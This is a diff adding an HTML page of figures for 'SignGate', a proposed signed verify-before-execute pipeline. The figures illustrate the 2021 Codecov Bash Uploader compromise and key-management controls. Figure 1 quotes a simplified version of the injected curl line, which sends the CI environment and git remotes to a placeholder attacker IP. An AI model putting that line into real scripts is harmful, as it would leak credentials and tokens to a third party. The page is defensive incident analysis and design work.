@@ -1,0 +1,219 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>SignGate figures</title>
+<style>
+  :root{--navy:#1B2F5B;--navy2:#2E4A86;--red:#B3261E;--redbg:#FDECEA;--green:#1E7D46;--greenbg:#E6F4EC;
+        --amber:#9A6700;--amberbg:#FFF4D6;--ink:#1D2433;--muted:#5B6475;--line:#C9D1E0;--card:#F4F6FB;}
+  *{box-sizing:border-box}
+  body{margin:0;background:#fff;font-family:Arial,Helvetica,sans-serif;color:var(--ink)}
+  .fig{width:1200px;padding:28px 32px;background:#fff;margin-bottom:40px}
+  h2{margin:0 0 18px;font-size:26px;color:var(--navy)}
+  .sub{font-size:15px;color:var(--muted);margin:-10px 0 18px}
+  .row{display:flex;align-items:stretch;gap:0}
+  .box{flex:1;border-radius:12px;padding:14px 14px;background:var(--card);border:2px solid var(--line);font-size:15px;line-height:1.35}
+  .box b{display:block;font-size:16px;margin-bottom:6px}
+  .num{display:inline-flex;width:28px;height:28px;border-radius:50%;align-items:center;justify-content:center;
+       font-weight:700;font-size:14px;color:#fff;background:var(--navy);margin-bottom:8px}
+  .bad{background:var(--redbg);border-color:#E7A29C}.bad .num{background:var(--red)}
+  .good{background:var(--greenbg);border-color:#9FD0B2}.good .num{background:var(--green)}
+  .warn{background:var(--amberbg);border-color:#E8C774}
+  .arrow{width:34px;display:flex;align-items:center;justify-content:center;font-size:28px;color:var(--muted);flex:0 0 34px}
+  .varrow{text-align:center;font-size:17px;color:var(--muted);line-height:1;margin:6px 0}
+  code{font-family:"Courier New",monospace;font-size:13px;background:#fff;border:1px solid var(--line);border-radius:4px;padding:1px 4px}
+  /* timeline */
+  .tl{position:relative;margin:30px 10px 10px;height:250px}
+  .tl .axis{position:absolute;top:118px;left:0;right:0;height:6px;background:var(--navy);border-radius:3px}
+  .tl .gap{position:absolute;top:112px;height:18px;background:repeating-linear-gradient(45deg,#E7A29C 0 8px,#FDECEA 8px 16px);border-radius:9px;border:2px solid var(--red)}
+  .ev{position:absolute;width:210px;font-size:14px;line-height:1.35}
+  .ev .d{font-weight:700;font-size:16px;color:var(--navy)}
+  .ev.up{top:0}.ev.down{top:150px}
+  .dot{position:absolute;top:109px;width:24px;height:24px;border-radius:50%;background:#fff;border:5px solid var(--navy)}
+  .dot.r{border-color:var(--red)}.dot.g{border-color:var(--green)}
+  /* architecture */
+  .zone{border:2px dashed var(--line);border-radius:14px;padding:14px;position:relative;background:#fff}
+  .zone .zt{font-weight:700;color:var(--navy);font-size:15px;margin-bottom:10px;text-transform:uppercase;letter-spacing:.5px}
+  .col{display:flex;flex-direction:column;gap:8px}
+  .pill{border-radius:10px;padding:9px 11px;font-size:14px;border:2px solid var(--line);background:var(--card)}
+  .pill.k{background:#EEF1FB;border-color:#9FB0DA}
+  .pill.g{background:var(--greenbg);border-color:#9FD0B2}
+  .pill.r{background:var(--redbg);border-color:#E7A29C}
+  .check{display:flex;gap:10px;align-items:center;border-radius:10px;padding:8px 10px;background:var(--greenbg);border:2px solid #9FD0B2;font-size:14px}
+  .check .n{flex:0 0 26px;height:26px;border-radius:50%;background:var(--green);color:#fff;font-weight:700;display:flex;align-items:center;justify-content:center;font-size:13px}
+  .fail{flex:0 0 150px;display:flex;align-items:center;font-size:13px;color:var(--red);font-weight:700}
+  table.t{border-collapse:collapse;width:100%;font-size:15px}
+  table.t th{background:var(--navy);color:#fff;text-align:left;padding:9px 10px}
+  table.t td{border-bottom:1px solid var(--line);padding:8px 10px;vertical-align:top}
+  .term{background:#0F1420;color:#D7DEEA;font-family:"DejaVu Sans Mono","Courier New",monospace;font-size:13.5px;line-height:1.45;
+        padding:18px 20px;border-radius:12px;white-space:pre}
+  .term .p{color:#7FD89B}.term .f{color:#FF7B72;font-weight:700}.term .h{color:#8AB4F8;font-weight:700}.term .y{color:#F2CC60}
+  .bar{height:34px;border-radius:6px;display:flex;align-items:center;padding-left:12px;color:#fff;font-weight:700;font-size:15px}
+</style></head>
+<body>
+
+<!-- F1 attack chain -->
+<div class="fig" id="f_attack">
+  <h2>How the Codecov Bash Uploader was compromised (Jan to Apr 2021)</h2>
+  <div class="row">
+    <div class="box bad"><span class="num">1</span><b>Secret left in image</b>A Google Cloud Storage <b style="display:inline;font-size:15px">HMAC key</b> was left in an intermediate layer of Codecov's public Self-Hosted Docker image.</div>
+    <div class="arrow">&#10140;</div>
+    <div class="box bad"><span class="num">2</span><b>Key extracted</b>The attacker pulled the image, inspected its layers and recovered the storage credential.</div>
+    <div class="arrow">&#10140;</div>
+    <div class="box bad"><span class="num">3</span><b>Uploader modified</b>The attacker used the key to overwrite the <code>bash</code> uploader in the GCS bucket, adding one exfiltration line.</div>
+    <div class="arrow">&#10140;</div>
+    <div class="box bad"><span class="num">4</span><b>Trusted &amp; executed</b>Customer CI ran <code>curl codecov.io/bash | bash</code>. No signature check, and hash checks were rarely used.</div>
+    <div class="arrow">&#10140;</div>
+    <div class="box bad"><span class="num">5</span><b>Secrets stolen</b><code>env</code> + <code>git remote -v</code> were sent to the attacker's server. Victims then had tokens, cloud keys and signing keys to rotate.</div>
+  </div>
+  <div style="margin-top:16px;font-size:14px;color:var(--muted)">Injected line (simplified): <code>curl -sm 0.5 -d "$(git remote -v)&lt;&lt;&lt;&lt;&lt;&lt; ENV $(env)" http://&lt;attacker-ip&gt;/upload/v2 || true</code></div>
+</div>
+
+<!-- F2 timeline -->
+<div class="fig" id="f_timeline">
+  <h2>Incident timeline</h2>
+  <div class="tl">
+    <div class="axis"></div>
+    <div class="gap" style="left:14%;width:44%"></div>
+    <div class="dot r" style="left:13%"></div>
+    <div class="dot r" style="left:57%"></div>
+    <div class="dot" style="left:71%"></div>
+    <div class="dot" style="left:84%"></div>
+    <div class="dot g" style="left:96%"></div>
+    <div class="ev up" style="left:0%"><div class="d">31 Jan 2021</div>First unauthorised change to the Bash Uploader via the leaked HMAC key.</div>
+    <div class="ev down" style="left:24%;width:260px;text-align:center"><div class="d" style="color:var(--red)">About 2 months undetected</div>Periodic malicious edits. Thousands of CI runs leak their environment variables.</div>
+    <div class="ev up" style="left:48%"><div class="d">1 Apr 2021</div>A customer's computed SHA-256 does not match the published one. Codecov removes the malicious code.</div>
+    <div class="ev down" style="left:62%"><div class="d">15 Apr 2021</div>Public security notice; customers told to rotate every credential.</div>
+    <div class="ev up" style="left:74%;width:190px"><div class="d">Late Apr 2021</div>Downstream impact (e.g. HashiCorp GPG release key rotated), federal investigation.</div>
+    <div class="ev down" style="left:84%;width:190px"><div class="d" style="color:var(--green)">2021 &ndash; 22</div>Signed (GPG + SHA-256) uploader replaces the Bash script.</div>
+  </div>
+</div>
+
+<!-- F3 vulnerable vs proposed architecture -->
+<div class="fig" id="f_arch">
+  <h2>Proposed architecture: SignGate verify-before-execute pipeline</h2>
+  <div class="row" style="gap:14px">
+    <div class="zone" style="flex:1.05">
+      <div class="zt">&#9312; Publisher (Codecov)</div>
+      <div class="col">
+        <div class="pill">Source code &#10140; hardened build<br><span style="font-size:12.5px;color:var(--muted)">secret-scan every image layer before publishing</span></div>
+        <div class="varrow">&#8595;</div>
+        <div class="pill">SHA-256 digest of uploader</div>
+        <div class="varrow">&#8595;</div>
+        <div class="pill k"><b>Ed25519 signature</b> on manifest<br>{artifact, version, sha256, size, key_id}</div>
+        <div class="pill k">Release key in <b>HSM / Cloud KMS</b> (90-day cert)</div>
+        <div class="pill k">Root key <b>offline</b>: certifies release keys, signs CRL</div>
+        <div class="pill g">Append entry to <b>transparency log</b></div>
+      </div>
+    </div>
+    <div class="arrow" style="flex:0 0 30px">&#10140;</div>
+    <div class="zone" style="flex:.8">
+      <div class="zt">&#9313; Distribution (GCS / CDN)</div>
+      <div class="col">
+        <div class="pill">uploader.sh</div>
+        <div class="pill k">manifest.json + signature + key certificate</div>
+        <div class="pill k">crl.json (root-signed)</div>
+        <div class="pill g">tlog.json + signed head</div>
+        <div style="font-size:13px;color:var(--muted);margin-top:4px">Served over <b>TLS 1.3</b>. Write access uses short-lived workload identity, not static HMAC keys.</div>
+        <div class="pill r" style="margin-top:6px">&#9888; Attacker may still gain write access here. Signatures make that useless.</div>
+        <div class="pill warn" style="border:2px solid #E8C774">&#128269; <b>Monitor</b> re-downloads every 5 min, alerts on mismatch or unknown log entry</div>
+      </div>
+    </div>
+    <div class="arrow" style="flex:0 0 30px">&#10140;</div>
+    <div class="zone" style="flex:1.15">
+      <div class="zt">&#9314; Customer CI + SignGate</div>
+      <div class="col">
+        <div class="pill k">policy.json in repo: <b>pinned</b> root &amp; log public keys, min version</div>
+        <div class="check"><span class="n">1</span>Key certificate signed by pinned root</div>
+        <div class="check"><span class="n">2</span>Key / artifact not revoked (CRL)</div>
+        <div class="check"><span class="n">3</span>Ed25519 manifest signature valid</div>
+        <div class="check"><span class="n">4</span>SHA-256(file) = signed sha256</div>
+        <div class="check"><span class="n">5</span>Version &ge; last seen (anti-rollback)</div>
+        <div class="check"><span class="n">6</span>Recorded in transparency log</div>
+        <div class="pill g"><b>Execute</b> with env allowlist:<br><code>PATH, CODECOV_TOKEN, GITHUB_SHA</code></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- F4 gate flow -->
+<div class="fig" id="f_flow" style="width:900px">
+  <h2>SignGate decision flow (fail-closed)</h2>
+  <div class="col" style="gap:4px">
+    <div class="pill k" style="text-align:center"><b>CI job starts</b>: download uploader bundle</div>
+    <div class="varrow">&#8595;</div>
+    <div class="row"><div class="check" style="flex:1"><span class="n">1</span>Is release key certified by the pinned root key?</div><div class="fail">&nbsp;&nbsp;NO &#10140; BLOCK</div></div>
+    <div class="varrow">&#8595; yes</div>
+    <div class="row"><div class="check" style="flex:1"><span class="n">2</span>Key and artifact absent from root-signed revocation list?</div><div class="fail">&nbsp;&nbsp;NO &#10140; BLOCK</div></div>
+    <div class="varrow">&#8595; yes</div>
+    <div class="row"><div class="check" style="flex:1"><span class="n">3</span>Ed25519 signature over manifest valid?</div><div class="fail">&nbsp;&nbsp;NO &#10140; BLOCK</div></div>
+    <div class="varrow">&#8595; yes</div>
+    <div class="row"><div class="check" style="flex:1"><span class="n">4</span>SHA-256 of downloaded file equals signed hash?</div><div class="fail">&nbsp;&nbsp;NO &#10140; BLOCK</div></div>
+    <div class="varrow">&#8595; yes</div>
+    <div class="row"><div class="check" style="flex:1"><span class="n">5</span>Version &ge; max(min_version, last seen)?</div><div class="fail">&nbsp;&nbsp;NO &#10140; BLOCK</div></div>
+    <div class="varrow">&#8595; yes</div>
+    <div class="row"><div class="check" style="flex:1"><span class="n">6</span>Manifest in hash-chained log with valid signed head?</div><div class="fail">&nbsp;&nbsp;NO &#10140; BLOCK</div></div>
+    <div class="varrow">&#8595; yes</div>
+    <div class="pill g" style="text-align:center"><b>RUN uploader</b> with least-privilege environment &middot; save last version &amp; log size</div>
+  </div>
+</div>
+
+<!-- F5 key hierarchy -->
+<div class="fig" id="f_keys">
+  <h2>Key management: hierarchy and lifecycle</h2>
+  <div class="row" style="gap:24px">
+    <div style="flex:1">
+      <div class="col" style="align-items:center">
+        <div class="pill k" style="width:78%;text-align:center"><b>Root key</b> (Ed25519)<br>Offline HSM, 2-person rule, used only a few times a year<br><span style="font-size:12.5px">Public key pinned in every customer's policy.json</span></div>
+        <div class="varrow">&#8595; signs</div>
+        <div class="row" style="gap:12px;width:100%">
+          <div class="pill k" style="flex:1;text-align:center"><b>Release-key certificate</b><br>Release key in Cloud KMS<br>valid 90 days, auto-rotated</div>
+          <div class="pill r" style="flex:1;text-align:center"><b>Revocation list (CRL)</b><br>revoked key IDs +<br>revoked artifact hashes</div>
+        </div>
+        <div class="varrow">&#8595; signs</div>
+        <div class="pill" style="width:78%;text-align:center"><b>Release manifest</b> {sha256, version, ...}</div>
+        <div class="pill g" style="width:78%;text-align:center;margin-top:10px"><b>Log key</b> (separate operator) signs transparency-log head</div>
+      </div>
+    </div>
+    <div style="flex:1">
+      <table class="t">
+        <tr><th style="width:26%">Stage</th><th>Control in SignGate</th></tr>
+        <tr><td><b>Generate</b></td><td>Ed25519 keys created inside HSM/KMS. Demo stores them as AES-256 encrypted PKCS#8.</td></tr>
+        <tr><td><b>Certify</b></td><td>Root signs {key_id, public key, purpose, not_before, not_after}.</td></tr>
+        <tr><td><b>Use</b></td><td>Only the release pipeline identity may call <i>sign</i>. Every use is logged.</td></tr>
+        <tr><td><b>Rotate</b></td><td>New release key every 90 days (<code>rotate_release_key</code>). Customers change nothing.</td></tr>
+        <tr><td><b>Revoke</b></td><td>Root-signed CRL entry blocks a key everywhere on the next CI run.</td></tr>
+        <tr><td><b>Destroy</b></td><td>Expired keys are destroyed in the HSM. Old signatures stay verifiable through the log.</td></tr>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- F6 before vs after exposure -->
+<div class="fig" id="f_exposure" style="width:900px">
+  <h2>Assume-breach test: CI secrets readable by a malicious uploader</h2>
+  <div style="font-size:15px;margin-bottom:6px"><b>Legacy</b> <code>curl | bash</code>: full CI environment</div>
+  <div class="bar" style="width:100%;background:var(--red)">8 / 8 secrets exposed (AWS keys, GitHub token, NPM, Docker, GPG key, DB URL, Codecov token)</div>
+  <div style="font-size:15px;margin:18px 0 6px"><b>SignGate</b>: environment allowlist</div>
+  <div class="row" style="align-items:center"><div class="bar" style="width:12.5%;background:var(--green);flex:0 0 12.5%">1 / 8</div><div style="padding-left:12px;font-size:15px">only <code>CODECOV_TOKEN</code> (low-value, upload-only token)</div></div>
+  <div style="font-size:14px;color:var(--muted);margin-top:16px">87.5 % fewer secrets exposed, even in the worst case where a malicious uploader somehow executes.</div>
+</div>
+
+<div class="fig" id="f_term1" style="width:1000px"><div class="term" id="t1"></div></div>
+<div class="fig" id="f_term2" style="width:1000px"><div class="term" id="t2"></div></div>
+<script>
+fetch('../../demo/demo_output.txt').then(r=>r.text()).then(t=>{
+  const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;');
+  const lines=t.split('\n').filter(l=>!/^\s+\[PASS\]    key_id/.test(l));
+  const fmt=ls=>ls.map(l=>{
+    let e=esc(l);
+    if(/\[PASS\]/.test(l)) e=e.replace('[PASS]','<span class="p">[PASS]</span>');
+    if(/\[FAIL\]/.test(l)) e='<span class="f">'+e+'</span>';
+    if(/^S\d|^Summary|^Average/.test(l)) e='<span class="h">'+e+'</span>';
+    if(/=> BLOCKED/.test(l)) e=e.replace('BLOCKED','<span class="f">BLOCKED</span>');
+    if(/=> ALLOWED/.test(l)) e=e.replace('ALLOWED','<span class="p">ALLOWED</span>');
+    return e}).join('\n');
+  const cut=lines.findIndex(l=>/^S5/.test(l));
+  document.getElementById('t1').innerHTML='<span class="y">$ python demo/attack_demo.py</span>\n'+fmt(lines.slice(0,cut)).trimEnd();
+  document.getElementById('t2').innerHTML='<span class="y">   ... (continued)</span>\n'+fmt(lines.slice(cut)).trimEnd();
+  document.body.dataset.ready='1';
+});
+</script>
+</body></html>
